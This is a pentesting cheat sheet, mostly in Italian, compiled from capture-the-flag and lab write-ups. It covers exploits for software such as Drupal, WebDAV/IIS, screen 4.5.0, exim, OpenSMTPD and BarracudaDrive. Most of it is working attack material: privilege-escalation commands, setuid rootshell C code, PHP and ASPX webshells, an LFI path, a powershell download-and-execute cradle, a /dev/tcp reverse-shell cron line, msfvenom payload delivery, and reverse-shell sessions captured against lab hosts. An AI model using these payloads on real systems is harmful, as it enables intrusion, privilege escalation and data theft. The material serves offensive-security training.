/usr/bin/find . -exec /bin/sh -p \; -quit
```

### Less gtfo
```
1. sudo -l
2. sudo -u root /bin/less /var/log/messages
3. :!/bin/bash
```

### Cs-cart template 1.3.3
Cred: admin/admin
```
Caricare shell.phtml in http://192.168.102.39/admin.php?target=template_editor

http://192.168.102.39/skins/shell.phtml
```

Oppure:
```
https://packetstormsecurity.com/files/159578/CS-Cart-1.3.3-Local-File-Inclusion.html

http://192.168.102.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

Vedi Payday di Providing Grounds.


### H2 Console
https://0xdf.gitlab.io/2018/11/30/htb-hawk.html

Vedi anche Jacko di Providing Grounds.
https://www.exploit-db.com/exploits/49384

#### Non-Existent Database
Si inserisce un db che non esiste e poi con credenziali sa/\<blank\> si fa login.
E poi si può eseguire una reverse shell eseguendo:
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

### Blogengine 3.3.6
https://medium.com/dont-code-me-on-that/tryhackme-hackpark-room-writeup-ba43be376d8b

https://www.exploit-db.com/exploits/46353


### Haraka 2.8.8
https://0xdf.gitlab.io/2019/04/13/htb-redcross.html


### sudoedit
https://0xdf.gitlab.io/2020/08/13/htb-joker.html

**sudoedit** is a shortcut for running **sudo** with the **-e** flag:
```
werkzeug@joker:~/testing/0xdf$ which sudoedit
/usr/bin/sudoedit
werkzeug@joker:~/testing/0xdf$ ls -l /usr/bin/sudoedit 
lrwxrwxrwx 1 root root 4 Oct 17  2016 /usr/bin/sudoedit -> sudo
```


```
werkzeug@joker:/home/alekos$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
```

Vedi il link che c'è la spiegazione dell'exploit.



### Squid http proxy 3.5.12
https://0xdf.gitlab.io/2020/08/13/htb-joker.html

In questo parla che trova le credenziali di squid proxy in tftp e poi si collega e naviga 127.0.0.1 tramite il proxy e poi trova le porte aperte tramite uno script e sulla porta 80 c'è una web app con una console python che usa per fare una reverse shell.

Nella console python usa:
```
>>> import os
>>> os.getcwd()
'/var/www'
>>> os.listdir('.')
['manage-shorty.py', 'testing', 'shorty']
>>> os.getlogin()
'werkzeug'

>>> os.system('ping -c1 10.10.14.13')
0
```
O vede le regole firewall per capire perchè falliva la reverse shell:
```
>>> with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017

```
Poi crea una reverse shell UDP (visto che in udp è accettato in input).


### proftpd 1.3.5
https://clarencesubia.medium.com/tryhackme-kenobi-walkthrough-6cd316fd9c3c


### keybase-redirector gtfo
https://www.exploit-db.com/exploits/46044


### screen 4.5.0 gtfo
https://0xdf.gitlab.io/2020/09/10/htb-haircut.html

Most of the exploit is creating and compiling two binary files. First, it creates a shared object / library:
```
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
```
This library has a dropshell function that is marked as __attribute__ ((__constructor__)). This means it will run before execution enters main. It is very simple. It just changes the owner of /tmp/rootshell to root:root, then changes the permissions to be SUID, removes the file /etc/ld.so.preload, and prints a message. This code is compiled into /tmp/libhax.so

Next the script creates /tmp/rootshell:
```
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```
It simply sets all the user and group ids to root and runs /bin/sh.

Now to the exploit. It’ll move into /etc, and then run the following screen command:
```
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
```
The options are as follows:

- -D -m - Start screen in “detached” mode, but don’t fork a new process, exiting when the session terminates
- -L ld.so.preload - turn on automatic output logging for the window
- echo -ne "\x0a/tmp/libhax.so" - command to run in the session, printing a newline followed by the path to the malicious library

So this will start screen output the path to the library, which will be logged to the /etc/ld.so.preload file, and then exit.

/etc/ld.so.preload holds a list of libraries that will attempt to be loaded each time any program is run. So the next time something runs as root, the malicious library will run as root. The script kicks that off by calling screen again:
```
screen -ls # screen itself is setuid, so... 
```
Finally, it will call the now SUID /tmp/rootshell.


### VNC
https://0xdf.gitlab.io/2018/09/08/htb-poison.html

```
charix@Poison:/usr/local/www/apache24/data % ps -auwwx | grep vnc
root    529   0.0  0.9  23620  9036 v0- I    12:54     0:00.07 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```
Let’s examine the command line options:
```
    :1 - display number 1
    -rfbauth /root/.vnc/passwd - specifies the file containing the password used to auth viewers
    -rfbport 5901 - tells us which port to connect to
    localhost - only listen locally
```

VNC is an interactive GUI program, so it won’t do us much good to connect from poison to itself. On the other hand, the VNC ports were only listening on localhost, so we can’t access them directory from our kali workstation. We’ll, use ssh tunneling and proxychains to connect to the local listener (we could have just as easily used -L to create a point to point tunnel.

Quindi si crea un ssh tunneling, nella macchina attaccante:
```
root@kali:~/hackthebox/poison-10.10.10.84# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 8081

root@kali:~/hackthebox/poison-10.10.10.84# ssh charix@10.10.10.84 -D 8081
```

E poi si avvia VNC: (**secret** è il password file che viene trovato nell'esempio dell'url https://0xdf.gitlab.io/2018/09/08/htb-poison.html)
```
root@kali:~/hackthebox/poison-10.10.10.84# proxychains vncviewer 127.0.0.1:5901 -passwd secret
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```


#### Decode VNC Password
https://0xdf.gitlab.io/2018/09/08/htb-poison.html
https://github.com/trinitronx/vncpasswd.py

```
root@kali:~/hackthebox/poison-10.10.10.84# python /opt/vncpasswd.py/vncpasswd.py -d -f secret
Cannot read from Windows Registry on a Linux system
Cannot write to Windows Registry on a Linux system
Decrypted Bin Pass= 'VNCP@$$!'
Decrypted Hex Pass= '564e435040242421'
```


### Wget < 1.18
Vedi esempio: https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html

Affetto da CVE-2016-4971.
In pratica, se la richiesta wget avrà come risposta 301 o 302 e viene reindirizzata ad un file in ftp, questo viene scaricato. Se si pensa ad un cron jobs in cui periodicamente viene fatta una richiesta wget allora si può usare per far reindirizzare ad un file preso da ftp (aprendo sulla macchina vittima un server ftp con authbind perchè probabilmente non si avranno i permessi) contenente il codice per aggiungere un cron jobs che esegue una reverse shell.

Script dell'exploit: https://github.com/mbadanoiu/CVE-2016-4971/blob/master/exploit_wget.py
Per la reverse shell, modificare lo script: (cambiando gli IP)
```
HTTP_LISTEN_IP = '10.0.3.1' 
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55' 
FTP_PORT = 21

ROOT_CRON = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1' \n"
```

### Graphql
https://0xdf.gitlab.io/2019/06/08/htb-help.html

Usa una query per avere username e password:
```
root@kali# curl -s 10.10.10.121:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

### helpdeskz
HelpDeskZ 1.0.2 - Arbitrary File Upload - 40300.py
Vedi esempio in: https://0xdf.gitlab.io/2019/06/08/htb-help.html

### Fuel CMS
Default credentials: admin: admin

versione 1.4.1 -> vulnerabile 47138.py, cambiare url.
Vedi esempio: https://blog.tryhackme.com/ignite-writeup/

File di configurazione in /var/www/html/fuel/application/config/database.php


### WebDAV
Altre info:
```
xampp/security/webdav.htpasswd

curl --user 'USER:PASS' -T nc.exe http://IP/webdav/nc.exe
```
WebDAV Elevation of Privilege Vulnerability - CVE-2016-0051


Si può usare **davtest**:
```
root@kali# davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: l8Qkwc
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_l8Qkwc
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm
PUT     shtml   FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_l8Qkwc
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
Executes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
Executes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
```

Oppure si può testare manualmente: (si prova a caricare un file e si vede se effettivamente è stato caricato)
Vede prima un file .txt:
```
root@kali# echo 0xdf > test.txt
root@kali# curl -X PUT http://10.10.10.15/df.txt -d @test.txt 
root@kali# curl http://10.10.10.15/df.txt
0xdf
```
E poi vede un file .aspx:
```
root@kali# curl -X PUT http://10.10.10.15/df.aspx -d @test.txt 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>
```

E si vede che il file .txt viene caricato ma non il .aspx

Allora si può caricare una shell aspx in .txt e poi muoverla come .aspx: (La shell .aspx presa da **/usr/share/webshells/aspx/cmdasp.aspx**)
```
root@kali# curl -X PUT http://10.10.10.15/0xdf.txt -d @cmdasp.aspx
```

E poi si muove utilizzando **curl**:
```
root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt
```

Preso da https://0xdf.gitlab.io/2019/03/06/htb-granny.html



#### WebDAV + ISS 6.0
https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html

Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                       \| windows/remote/41738.py

Si può usare https://github.com/danigargu/explodingcan



### Drupal
https://0xdf.gitlab.io/2018/11/30/htb-hawk.html
Per Drupal si può usare **droopescan**:
```
root@kali# /opt/droopescan/droopescan scan drupal -u http://10.10.10.9

[+] Themes found:
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login

[+] Possible version(s):
    7.54

[+] Plugins found:
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    image http://10.10.10.9/modules/image/
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/

[+] Scan finished (0:40:53.627982 elapsed)
```


Drupal 7.x Module Services \- Remote Code Execution 	\| exploits/php/webapps/41564.php

There’s a section I need to customize, that will allow me to specify url, endpoint_path, endpoint, filename, and data.
Aggiornamento script:
```
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => '0xdf.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```
Execution:
```
root@kali# php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/0xdf.php
```

Quindi scrive le informazioni in session.json e in user.json e crea una webshell in http://10.10.10.9/0xdf.php e quindi si può usare per eseguire una reverse shell.
Vedi esempio: https://0xdf.gitlab.io/2019/03/12/htb-bastard.html

#### RCE utilizzando php plugin
https://0xdf.gitlab.io/2018/11/30/htb-hawk.html


#### Drupalgeddon2
Qui https://0xdf.gitlab.io/2019/03/12/htb-bastard.html viene usato.
Setta il proxy a localhost:
```
# Settings - Proxy information (nil to disable)
proxy_addr = '127.0.0.1'
proxy_port = 8080
```

E poi gli dava problemi nell'esecuzione e ha cambiato la richiesta da POST a GET perchè ha visto che POST non era permesso:
```
HTTP/1.1 405 Method Not Allowed
Allow: GET, HEAD, OPTIONS, TRACE
Content-Type: text/html
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Thu, 07 Mar 2019 13:19:20 GMT
Connection: close
Content-Length: 1293
```

E poi lo esegue:
```
root@kali# ruby 44449.rb http://10.10.10.9/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt (200)
[+] Drupal!: 7.54
--------------------------------------------------------------------------------
[*] Testing: Code Execution
[*] Payload: echo WVJGKBOE
[+] Result : WVJGKBOE
[{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"368chTEHIkCulf-OByrxM4BA-4dnOTil83SURlLwdqI"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"368chTEHIkCulf-OByrxM4BA-4dnOTil83SURlLwdqI"}}}]
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: File Write To Web Root (./)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./s.php
[+] Result : [{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ZhoePAwixyS4fgsUjDewohxgu6fjhuZvkuZ-7g1o5Ow"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ZhoePAwixyS4fgsUjDewohxgu6fjhuZvkuZ-7g1o5Ow"}}}]
[!] Target is NOT exploitable. No write access here!
[*] Testing: File Write To Web Root (./sites/default/)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./sites/default/s.php
[+] Result : [{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"A0vSSq_CrSQFs5fhTMcTp4kmAIPC3kngzkEoGUcfU68"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"A0vSSq_CrSQFs5fhTMcTp4kmAIPC3kngzkEoGUcfU68"}}}]
[!] Target is NOT exploitable. No write access here!
[*] Testing: File Write To Web Root (./sites/default/files/)
[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee ./sites/default/files/s.php
[+] Result : [{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ihPSnSsmU8uU3SKBtuN2qCcnNQA1Ha9CqKpMiVhINfs"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"ihPSnSsmU8uU3SKBtuN2qCcnNQA1Ha9CqKpMiVhINfs"}}}]
[!] Target is NOT exploitable. No write access here!
--------------------------------------------------------------------------------
[!] FAILED to find writeable folder
[*] Dropping back to ugly shell...
drupalgeddon2>> whoami
nt authority\iusr
```

E ha una shell.
Per avere una reverse shell, prende il file powershell da https://github.com/samratashok/nishang ed esegue:
```
drupalgeddon2>> powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/shell.ps1')
```

E si ottiene la reverse shell:
```
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:59199.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>whoami
nt authority\iusr
```

#### Drupalgeddon3
Viene usato se si è autenticati.
Vedi https://0xdf.gitlab.io/2019/03/12/htb-bastard.html



### HttpFileServer (HFS)
Rejetto HttpFileServer 2.3.x - Remote Command | windows/webapps/49125.py

Vedi esempio di reverse shell: https://0xdf.gitlab.io/2021/03/17/htb-optimum.html


### exim-4.84-7
Preso da https://thedarktechie.wordpress.com/2017/09/01/pluck-walk-through-without-exploiting-pdmenurc/

https://www.exploit-db.com/exploits/39535
```
$ cd /tmp
$ cat > /tmp/root.pm << EOF
> package root;
> package strict;
> package warnings;
>
> system(“/bin/sh”);
> EOF
$ ls -ltr
total 8
-rw-rw-rw- 1 www-data www-data 68 Sep 2 00:08 root.pm

$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim-4.84-7 -ps
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

### exim 4.84-3
Local Privilege Escalation
https://www.exploit-db.com/exploits/39535

Usato su Pluck di HTB: https://www.whitelist1.com/2018/09/pluck.html


### JAMES SMTP Server 2.3.2 (Beta machine Lab)
root:root

Questo cambia le password degli utenti:
jamesSmtpServer.py
https://www.exploit-db.com/exploits/35513

Questo utilizza la creazione di un nuovo utente che crea il file **/etc/bash_completion.d** per eseguire una reverse shell:
https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html



### OpenSMTPD (port 25)
Bratarna di Providing Grounds.
https://zeyu2001.gitbook.io/pentesting/proving-grounds/warm-up/bratarina


https://www.exploit-db.com/exploits/48051

```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Bratarina]
└─$  ./raptor_opensmtpd.pl RCE 192.168.231.71 192.168.49.231
raptor_opensmtpd.pl - LPE and RCE in OpenBSD's OpenSMTPD
Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>

< 220 bratarina ESMTP OpenSMTPD
> HELO fnord
< 250 bratarina Hello fnord [192.168.49.231], pleased to meet you
> MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>
< 250 2.0.0 Ok
> RCPT TO:<root>
< 250 2.1.5 Destination address valid: Recipient ok
> DATA
< 354 Enter mail, end with "." on a line by itself
< 250 2.0.0 f8bf4a34 Message accepted for delivery

Payload sent, please wait 5 seconds...
80: inverse host lookup failed: Unknown host
listening on [any] 34103 ...



(base) ┌──(kali㉿kali)-[~/Programs/JuicyPotato]
└─$ sudo nc -lnvp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.231] from (UNKNOWN) [192.168.231.71] 57454
/bin/sh: 0: can't access tty; job control turned off
# id 
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt
26bcea75ccba60f179ce42707a2f04a8
```

Oppure

searchsploit -x linux/remote/47984.py

To leverage this, we’ll need to first create a reverse shell payload and host it on our Kali machine.
```
kali@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.135 LPORT=445
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next we’ll copy the exploit to a working directory.
```
kali@kali:~$ searchsploit -m 47984
  Exploit: OpenSMTPD 6.6.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/47984.py
```

Let’s run the exploit to download our payload to the target.
```
kali@kali:~$ python3 47984.py 192.168.135.71 25 'wget 192.168.49.135/shell -O /tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
kali@kali:~$ python3 47984.py 192.168.135.71 25 'chmod +x /tmp/shell'

[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

Finally, we’ll start a netcat listener and run the exploit one last time to obtain a reverse shell.

```
kali@kali:~$ python3 47984.py 192.168.135.71 25 '/tmp/shell'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

And we obtain the reverse shell:
```
kali@kali:~$ sudo nc -lvp 445
listening on [any] 445 ...
192.168.135.71: inverse host lookup failed: Unknown host
connect to [192.168.49.135] from (UNKNOWN) [192.168.135.71] 54626
ifconfig -a && hostname && whoami
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.135.71  netmask 255.255.255.0  broadcast 192.168.135.255
        ether 00:50:56:bf:c7:95  txqueuelen 1000  (Ethernet)
        RX packets 2689  bytes 180034 (180.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1111  bytes 301967 (301.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2998  bytes 653581 (653.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2998  bytes 653581 (653.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bratarina
root
```



### Barracuda 6.5 
https://zeyu2001.gitbook.io/pentesting/proving-grounds/get-to-work/medjed

**Local Privilege Escalation**
https://packetstormsecurity.com/files/158812/BarracudaDrive-6.5-Local-Privilege-Escalation.html

Nello file .c possiamo inserire:
```
#include <windows.h>
#include <winbase.h>

int main(void){
     system("C:\\Sites\\userpro\\nc.exe 192.168.49.237 139 -e cmd.exe");
     WinExec("C:\\bd\\bd.service.exe", 0);
    return 0;
}
```

Così da avere una reverse shell, invece di aggiungere un nuovo utente amministratore (come viene fatto nella PoC dell'url sopra) perchè potremmo non avere una porta rdp o potrebbe non funzionare psexec e quindi non riuscire a loggarsi con il nuovo utente.


### Unreal Tournament
Vedi UT99 di Providing Grounds.

Unreal Tournament - Remote Buffer Overflow (SEH)
/usr/share/exploitdb/exploits/windows/remote/16145.pl

```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ perl 16145.pl 192.168.128.44 7778 192.168.49.128 80


(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/UT99]
└─$ sudo nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.128.44] 49224
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>
```


### FoxitReader (Windows program)
Vedi UT99 di Providing Grounds.
https://www.exploit-db.com/exploits/36390

```
sc qc FoxitCloudUpdateService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: FoxitCloudUpdateService
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
